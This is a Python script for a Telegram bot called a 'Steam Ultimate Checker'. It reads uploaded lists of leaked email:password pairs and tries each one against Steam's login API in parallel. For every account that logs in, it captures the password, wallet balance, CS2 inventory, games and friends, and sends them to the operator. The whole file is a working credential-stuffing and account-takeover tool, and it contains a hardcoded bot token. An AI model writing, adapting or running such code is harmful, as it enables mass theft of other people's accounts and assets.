import sys, os, re, json, time, random, threading, requests, base64
from datetime import datetime
import urllib3
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = "8879666700:AAGfBfwt7SnvFPusfW82cnBaKu2JwhZG68Y"
ADMIN_ID = 7969180514

THREAD_COUNT = 5

HITS_FILE = "steamhits.txt"

tarama_durdur = {}
multi_bekleyen = {}

def send_message(chat_id, text, reply_markup=None):
    try:
        data = {"chat_id": chat_id, "text": text}
        if reply_markup:
            data["reply_markup"] = json.dumps(reply_markup)
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data=data, timeout=15)
    except:
        pass

def send_document(chat_id, filepath):
    try:
        with open(filepath, 'rb') as f:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                          data={"chat_id": chat_id},
                          files={"document": (os.path.basename(filepath), f)}, timeout=30)
    except:
        pass

def download_file(file_id):
    try:
        file_info = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getFile",
                                 params={"file_id": file_id}, timeout=15).json()
        if not file_info.get("ok"):
            return None
        file_path = file_info["result"]["file_path"]
        file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
        content = requests.get(file_url, timeout=30).text
        return content
    except:
        return None

def kerpetennecmi(line):
    line = line.strip()
    if not line:
        return None
    for sep in (":", "|", ";", ","):
        if sep in line:
            parts = line.split(sep, 1)
            email, pwd = parts[0].strip(), parts[1].strip()
            if email and pwd:
                return f"{email}:{pwd}"
    return None

def cokludosyayukle(dosya_listesi):
    tum_hesaplar = []
    for dosya in dosya_listesi:
        dosya = dosya.strip()
        if not dosya:
            continue
        if not os.path.exists(dosya):
            continue
        try:
            with open(dosya, 'r', encoding='utf-8', errors='ignore') as f:
                satirlar = [l.strip() for l in f if ':' in l.strip() and not l.strip().startswith('#')]
            for satir in satirlar:
                norm = kerpetennecmi(satir)
                if norm:
                    tum_hesaplar.append(norm)
        except:
            pass
    return list(dict.fromkeys(tum_hesaplar))

def benferooolum():
    with open(HITS_FILE, 'w', encoding='utf-8') as fh:
        pass

class SteamChecker:
    def __init__(self, timeout=30):
        self.timeout = timeout
        self.session = None

    def _create_session(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36",
            ]),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": "https://store.steampowered.com",
            "Referer": "https://store.steampowered.com/",
        })
        return self.session

    def check(self, username: str, password: str):
        self._create_session()
        try:
            rsa_resp = self.session.get(
                "https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/",
                params={"account_name": username},
                timeout=self.timeout
            ).json().get("response", {})
            
            if not rsa_resp.get("publickey_mod"):
                return {"status": "BAD", "error": "RSA key failed"}

            key = RSA.construct((int(rsa_resp["publickey_mod"], 16), int(rsa_resp["publickey_exp"], 16)))
            enc_pwd = base64.b64encode(PKCS1_v1_5.new(key).encrypt(password.encode())).decode()

            resp = self.session.post(
                "https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/",
                data={
                    "account_name": username,
                    "encrypted_password": enc_pwd,
                    "encryption_timestamp": rsa_resp["timestamp"],
                    "remember_login": "true",
                    "website_id": "Community",
                    "device_friendly_name": "Julian-Checker"
                },
                timeout=self.timeout
            ).json().get("response", {})

            steamid = resp.get("steamid")
            if not steamid:
                return {"status": "BAD", "error": "No steamid"}

            guard_types = [c.get("confirmation_type", 0) for c in resp.get("allowed_confirmations", [])]
            if any(t in (3, 4) for t in guard_types):
                return {"status": "2FA", "steamid": steamid, "username": username}

            time.sleep(0.5)
            poll = self.session.post(
                "https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1/",
                data={"client_id": resp["client_id"], "request_id": resp["request_id"]},
                timeout=self.timeout
            ).json().get("response", {})

            access = poll.get("access_token")
            if not access:
                return {"status": "BAD", "error": "No access token"}

            self.session.cookies.set("steamLoginSecure", f"{steamid}||{access}", domain=".steamcommunity.com")

            result = {
                "status": "HIT",
                "steamid": steamid,
                "username": username,
                "password": password,
            }

            # Profil
            try:
                r = self.session.get(
                    "https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v2/",
                    params={"access_token": access, "steamids": steamid},
                    timeout=10
                )
                if r.status_code == 200:
                    players = r.json().get("response", {}).get("players", [])
                    if players:
                        p = players[0]
                        result["name"] = p.get("personaname", "N/A")
                        result["realname"] = p.get("realname", "Gizli")
                        result["country"] = p.get("loccountrycode", "—")
                        result["profile_url"] = p.get("profileurl", "")
                        if p.get("timecreated"):
                            result["created_date"] = datetime.fromtimestamp(p["timecreated"]).strftime("%d/%m/%Y")
            except:
                pass

            # Ban
            try:
                r = self.session.get(
                    "https://api.steampowered.com/ISteamUser/GetPlayerBans/v1/",
                    params={"access_token": access, "steamids": steamid},
                    timeout=10
                )
                if r.status_code == 200:
                    p = r.json().get("players", [{}])[0]
                    result["vac_banned"] = p.get("VACBanned", False)
                    result["game_bans"] = p.get("NumberOfGameBans", 0)
                    if p.get("VACBanned"):
                        result["vac"] = "🚫 VAC BAN"
                    elif p.get("NumberOfGameBans", 0) > 0:
                        result["vac"] = f"🚫 {p.get('NumberOfGameBans', 0)} GAME BAN"
                    else:
                        result["vac"] = "✅ Temiz"
            except:
                pass

            # Level
            try:
                r = self.session.get(
                    "https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/",
                    params={"access_token": access, "steamid": steamid},
                    timeout=10
                )
                if r.status_code == 200:
                    result["level"] = r.json().get("response", {}).get("player_level", 0)
            except:
                pass

            # Oyunlar
            try:
                r = self.session.get(
                    "https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/",
                    params={"access_token": access, "steamid": steamid, "include_appinfo": "true", "include_played_free_games": "true"},
                    timeout=60
                )
                if r.status_code == 200:
                    games = r.json().get("response", {}).get("games", [])
                    games_sorted = sorted(games, key=lambda x: x.get("playtime_forever", 0), reverse=True)
                    result["game_count"] = len(games_sorted)
                    result["total_playtime_hours"] = sum(g.get("playtime_forever", 0) for g in games_sorted) // 60
                    result["all_games"] = games_sorted
            except:
                pass

            # Bakiye
            try:
                r = self.session.get(
                    f"https://store.steampowered.com/api/getWalletBalance/?steamid={steamid}",
                    timeout=10
                )
                if r.status_code == 200 and r.json().get("success"):
                    result["balance"] = r.json().get("formattedBalance", "—")
            except:
                pass

            # CS2 Envanter
            try:
                r = self.session.get(
                    f"https://steamcommunity.com/inventory/{steamid}/730/2",
                    params={"l": "english", "count": "5000"},
                    timeout=15
                )
                if r.status_code == 200:
                    count = r.json().get("total_inventory_count", 0)
                    result["inventory_count"] = count
            except:
                pass

            # Arkadaş
            try:
                r = self.session.get(
                    "https://api.steampowered.com/ISteamUser/GetFriendList/v1/",
                    params={"access_token": access, "steamid": steamid, "relationship": "friend"},
                    timeout=10
                )
                if r.status_code == 200:
                    friends = r.json().get("friendslist", {}).get("friends", [])
                    result["friend_count"] = len(friends)
            except:
                pass

            result["last_login"] = datetime.now().strftime("%d/%m/%Y %H:%M")
            return result

        except requests.exceptions.Timeout:
            return {"status": "BAD", "error": "Timeout"}
        except requests.exceptions.ConnectionError:
            return {"status": "BAD", "error": "Connection error"}
        except Exception as e:
            return {"status": "BAD", "error": str(e)[:100]}
        finally:
            if self.session:
                self.session.close()

def hit_mesaji(result):
    """Hit için Telegram mesajı oluştur"""
    now = datetime.now().strftime('%d.%m.%Y %H:%M:%S')
    mesaj = f"🎮 KIDO FULL CAPTURE - {now}\n\n"
    mesaj += f"👤 Kullanıcı    : {result.get('username', 'N/A')}\n"
    mesaj += f"🔑 Şifre        : {result.get('password', 'N/A')}\n"
    mesaj += f"📛 İsim         : {result.get('name', 'N/A')}\n"
    mesaj += f"🌍 Ülke         : {result.get('country', '—')}\n"
    mesaj += f"💰 Bakiye       : {result.get('balance', '—')}\n"
    mesaj += f"⭐ Seviye       : Lv.{result.get('level', '0')}\n"
    mesaj += f"🚫 VAC          : {result.get('vac', '✅ Temiz')}\n"
    mesaj += f"👥 Arkadaş      : {result.get('friend_count', 0)}\n"
    mesaj += f"🎒 CS2 Eşya     : {result.get('inventory_count', 0)}\n"
    mesaj += f"⏱ Oynama       : {result.get('total_playtime_hours', 0)} saat\n"
    mesaj += f"🆔 SteamID      : {result.get('steamid', 'N/A')}\n"
    mesaj += f"🎮 Oyun Sayısı  : {result.get('game_count', 0)}\n"
    
    games = result.get('all_games', [])
    if games:
        mesaj += f"\n🎯 TÜM OYUNLAR ({len(games)} adet)\n"
        for game in games[:20]:
            hours = game.get('playtime_forever', 0) // 60
            name = game.get('name', 'Unknown')
            mesaj += f"• {name[:40]} ({hours} saat)\n"
        if len(games) > 20:
            mesaj += f"... ve {len(games) - 20} oyun daha\n"
    
    mesaj += f"\n@KIDO • discord:projectsystem"
    return mesaj

def hit_dosyaya_yaz(result):
    """Hit'i dosyaya kaydet"""
    now = datetime.now().strftime('%d.%m.%Y %H:%M:%S')
    with open(HITS_FILE, 'a', encoding='utf-8') as f:
        f.write(f"\n{'='*70}\n")
        f.write(f"🎮 KIDO FULL CAPTURE - {now}\n")
        f.write(f"{'='*70}\n")
        f.write(f"👤 Kullanıcı    : {result.get('username', 'N/A')}\n")
        f.write(f"🔑 Şifre        : {result.get('password', 'N/A')}\n")
        f.write(f"📛 İsim         : {result.get('name', 'N/A')}\n")
        f.write(f"🌍 Ülke         : {result.get('country', '—')}\n")
        f.write(f"💰 Bakiye       : {result.get('balance', '—')}\n")
        f.write(f"⭐ Seviye       : Lv.{result.get('level', '0')}\n")
        f.write(f"🚫 VAC          : {result.get('vac', '✅ Temiz')}\n")
        f.write(f"👥 Arkadaş      : {result.get('friend_count', 0)}\n")
        f.write(f"🎒 CS2 Eşya     : {result.get('inventory_count', 0)}\n")
        f.write(f"⏱ Oynama       : {result.get('total_playtime_hours', 0)} saat\n")
        f.write(f"🆔 SteamID      : {result.get('steamid', 'N/A')}\n")
        f.write(f"🎮 Oyun Sayısı  : {result.get('game_count', 0)}\n")
        
        games = result.get('all_games', [])
        if games:
            f.write(f"\n{'─'*70}\n")
            f.write(f"🎯 TÜM OYUNLAR ({len(games)} adet)\n")
            f.write(f"{'─'*70}\n")
            for game in games:
                hours = game.get('playtime_forever', 0) // 60
                name = game.get('name', 'Unknown')
                f.write(f"  • {name} ({hours} saat)\n")
        
        f.write(f"\n{'='*70}\n")
        f.write(f"@KIDO • discord:projectsystem\n")
        f.write(f"{'='*70}\n\n")

def ana_menu(chat_id):
    if str(chat_id) != str(ADMIN_ID):
        return
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🚀 Start", "callback_data": "baslat"},
             {"text": "📂 Multi Scan", "callback_data": "multi_start"}],
            [{"text": "⚡ Thread Settings", "callback_data": "thread_menu"},
             {"text": "📊 Status", "callback_data": "durum"}],
        ]
    }
    
    text = (
        f"╔══════════════════════════════════════════════╗\n"
        f"║     STEAM ULTIMATE CHECKER - KIDO          ║\n"
        f"║     👑 ADMIN ONLY 👑                       ║\n"
        f"╚══════════════════════════════════════════════╝\n\n"
        f"⚡ Thread: {THREAD_COUNT}\n"
    )
    send_message(chat_id, text, keyboard)

def durum_menu(chat_id):
    if str(chat_id) != str(ADMIN_ID):
        return
    text = f"👑 STATUS\n\n⚡ Thread: {THREAD_COUNT}\n📂 Limitsiz\n"
    send_message(chat_id, text)

def thread_menu(chat_id):
    if str(chat_id) != str(ADMIN_ID):
        return
    global THREAD_COUNT
    keyboard = {
        "inline_keyboard": [
            [{"text": "1", "callback_data": "thread_1"},
             {"text": "2", "callback_data": "thread_2"},
             {"text": "3", "callback_data": "thread_3"}],
            [{"text": "4", "callback_data": "thread_4"},
             {"text": "5", "callback_data": "thread_5"},
             {"text": "10", "callback_data": "thread_10"}],
            [{"text": "🔙 Back", "callback_data": "main_menu"}],
        ]
    }
    send_message(chat_id, f"⚡ THREAD SETTINGS\n\nCurrent: {THREAD_COUNT} Thread", keyboard)

def tarama_yap(chat_id, accounts, dosya_adi):
    global THREAD_COUNT
    benferooolum()
    
    dogrudogru = len(accounts)
    babasarkikalmadi = time.time()
    tarama_durdur[chat_id] = False
    
    egriegri = {"checked": 0, "hit": 0, "bad": 0, "twofa": 0, "errors": 0}
    
    lock = threading.Lock()
    semaphore = threading.BoundedSemaphore(THREAD_COUNT)
    
    sent = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                          data={"chat_id": chat_id, "text": "📊 Scanning started..."}, timeout=15).json()
    progress_message_id = sent["result"]["message_id"] if sent.get("ok") else None

    def check_one(combo):
        nonlocal egriegri
        try:
            if tarama_durdur.get(chat_id, False):
                semaphore.release()
                return
            username, password = combo.split(":", 1)
            
            checker = SteamChecker(30)
            result = checker.check(username, password)
            
            with lock:
                if result.get("status") == "HIT":
                    egriegri["hit"] += 1
                    hit_dosyaya_yaz(result)
                    mesaj = hit_mesaji(result)
                    send_message(chat_id, mesaj)
                    print(f"✅ HIT: {username}", flush=True)
                elif result.get("status") == "2FA":
                    egriegri["twofa"] += 1
                    print(f"🔐 2FA: {username}", flush=True)
                else:
                    egriegri["bad"] += 1
        except Exception as e:
            with lock:
                egriegri["errors"] += 1
        finally:
            with lock:
                egriegri["checked"] += 1
            semaphore.release()

    def progress_updater():
        nonlocal egriegri, dogrudogru, babasarkikalmadi
        while egriegri["checked"] < dogrudogru:
            time.sleep(3)
            if tarama_durdur.get(chat_id, False):
                break
            with lock:
                checked = egriegri["checked"]
                hit = egriegri["hit"]
                twofa = egriegri["twofa"]
                bad = egriegri["bad"]
                errors = egriegri["errors"]
            total = dogrudogru
            elapsed = time.time() - babasarkikalmadi
            yuzde = (checked / total) * 100 if total > 0 else 0
            cpm = (checked / elapsed) * 60 if elapsed > 0 else 0
            filled = int(20 * checked // total) if total > 0 else 0
            bar = '█' * filled + '░' * (20 - filled)
            mesaj = (
                f"📊 SCANNING IN PROGRESS\n\n"
                f"📁 File: {dosya_adi}\n"
                f"📊 Progress: {checked}/{total} ({yuzde:.1f}%)\n"
                f"{bar}\n\n"
                f"✅ HITS: {hit}\n"
                f"🔐 2FA: {twofa}\n"
                f"❌ BAD: {bad}\n"
                f"⚠️ ERRORS: {errors}\n\n"
                f"⏰ Elapsed: {int(elapsed)}s\n"
                f"⚡ CPM: {int(cpm)}\n\n"
                f"Stop: /stop"
            )
            if progress_message_id:
                try:
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText",
                                  data={"chat_id": chat_id, "message_id": progress_message_id, "text": mesaj}, timeout=15)
                except:
                    pass

    updater = threading.Thread(target=progress_updater, daemon=True)
    updater.start()

    threads = []
    for combo in accounts:
        if tarama_durdur.get(chat_id, False):
            break
        semaphore.acquire()
        t = threading.Thread(target=check_one, args=(combo,))
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    elapsed = time.time() - babasarkikalmadi
    durdu = tarama_durdur.get(chat_id, False)
    
    stats = (
        f"{'⏹️ SCAN STOPPED' if durdu else '✅ SCAN COMPLETED'} ({int(elapsed)}s)\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔱 Total: {dogrudogru}\n"
        f"✅ HITS: {egriegri['hit']}\n"
        f"🔐 2FA: {egriegri['twofa']}\n"
        f"❌ BAD: {egriegri['bad']}\n"
        f"⚠️ ERRORS: {egriegri['errors']}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📦 Sending result file..."
    )
    send_message(chat_id, stats)
    
    if os.path.exists(HITS_FILE) and os.path.getsize(HITS_FILE) > 0:
        send_document(chat_id, HITS_FILE)

def telegram_bot():
    global offset, THREAD_COUNT
    offset = 0
    while True:
        try:
            r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates",
                             params={"offset": offset, "timeout": 30}, timeout=35)
            data = r.json()
            if data.get("ok"):
                for update in data.get("result", []):
                    offset = update["update_id"] + 1
                    if "callback_query" in update:
                        cb = update["callback_query"]
                        chat_id = cb["message"]["chat"]["id"]
                        if str(chat_id) != str(ADMIN_ID):
                            continue
                        data_cb = cb["data"]
                        if data_cb == "main_menu":
                            ana_menu(chat_id)
                        elif data_cb == "durum":
                            durum_menu(chat_id)
                        elif data_cb == "baslat":
                            send_message(chat_id, "📂 Send your combo file. Scanning will start automatically.")
                        elif data_cb == "multi_start":
                            send_message(chat_id, "📂 Send your combo files. Type /bitti when done.")
                            multi_bekleyen[chat_id] = []
                        elif data_cb == "thread_menu":
                            thread_menu(chat_id)
                        elif data_cb.startswith("thread_"):
                            THREAD_COUNT = int(data_cb.split("_")[1])
                            send_message(chat_id, f"✅ Thread set to {THREAD_COUNT}.")
                            ana_menu(chat_id)
                        continue
                    if "message" not in update:
                        continue
                    msg = update["message"]
                    chat_id = msg["chat"]["id"]
                    if str(chat_id) != str(ADMIN_ID):
                        continue
                    if "document" in msg:
                        file_id = msg["document"]["file_id"]
                        file_name = msg["document"].get("file_name", "combo.txt")
                        
                        if chat_id in multi_bekleyen:
                            multi_bekleyen[chat_id].append((file_id, file_name))
                            send_message(chat_id, f"📂 {file_name} added. Total: {len(multi_bekleyen[chat_id])} files. Type /bitti when done.")
                        else:
                            send_message(chat_id, "📂 File received, downloading...")
                            content = download_file(file_id)
                            if content is None:
                                send_message(chat_id, "❌ File could not be downloaded.")
                                continue
                            with open("uploaded_combo.txt", "w", encoding="utf-8") as f:
                                f.write(content)
                            accounts = cokludosyayukle(["uploaded_combo.txt"])
                            if not accounts:
                                send_message(chat_id, "❌ No valid accounts found.")
                                continue
                            send_message(chat_id, f"🔱 {len(accounts)} accounts found. Scanning started...")
                            t = threading.Thread(target=tarama_yap, args=(chat_id, accounts, file_name), daemon=True)
                            t.start()
                    elif msg.get("text") == "/start":
                        ana_menu(chat_id)
                    elif msg.get("text") == "/stop":
                        tarama_durdur[chat_id] = True
                        send_message(chat_id, "⏹️ Stopping scan... Results will be sent shortly.")
                    elif msg.get("text") == "/durum":
                        durum_menu(chat_id)
                    elif msg.get("text") == "/thread":
                        thread_menu(chat_id)
                    elif msg.get("text") == "/bitti":
                        if chat_id in multi_bekleyen and multi_bekleyen[chat_id]:
                            send_message(chat_id, "📂 Downloading and merging all files...")
                            tum_hesaplar = []
                            for fid, fname in multi_bekleyen[chat_id]:
                                content = download_file(fid)
                                if content:
                                    with open(f"multi_{fid}.txt", "w", encoding="utf-8") as f:
                                        f.write(content)
                                    hesaplar = cokludosyayukle([f"multi_{fid}.txt"])
                                    tum_hesaplar.extend(hesaplar)
                            benzersiz = list(dict.fromkeys(tum_hesaplar))
                            send_message(chat_id, f"🔱 Total {len(benzersiz)} accounts. Scanning started...")
                            t = threading.Thread(target=tarama_yap, args=(chat_id, benzersiz, "multi_combo"), daemon=True)
                            t.start()
                            del multi_bekleyen[chat_id]
                        else:
                            send_message(chat_id, "❌ Start Multi Scan first.")
        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    print("Bot started...")
    telegram_bot()
